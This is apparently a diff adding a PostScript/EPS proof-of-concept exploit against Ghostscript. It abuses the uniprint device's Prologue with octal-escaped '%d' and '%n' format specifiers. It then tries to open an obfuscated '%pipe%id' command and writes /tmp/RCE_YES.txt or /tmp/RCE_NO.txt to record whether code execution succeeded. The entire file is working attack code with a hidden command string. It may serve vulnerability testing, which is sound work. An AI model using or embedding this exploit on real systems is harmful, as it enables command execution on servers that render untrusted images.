@@ -1,0 +1,25 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Spray
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (\045d\045d\045d\045d\045n\045d\045d\045d\045n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% Back to png
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% Test pipe only
+{
+  (\045\160\151\160\145\045\151\144) (w) file closefile
+  (/tmp/RCE_YES.txt) (w) file (RCE) writestring closefile
+} stopped {
+  (/tmp/RCE_NO.txt) (w) file (no) writestring closefile
+} if
+
+showpage
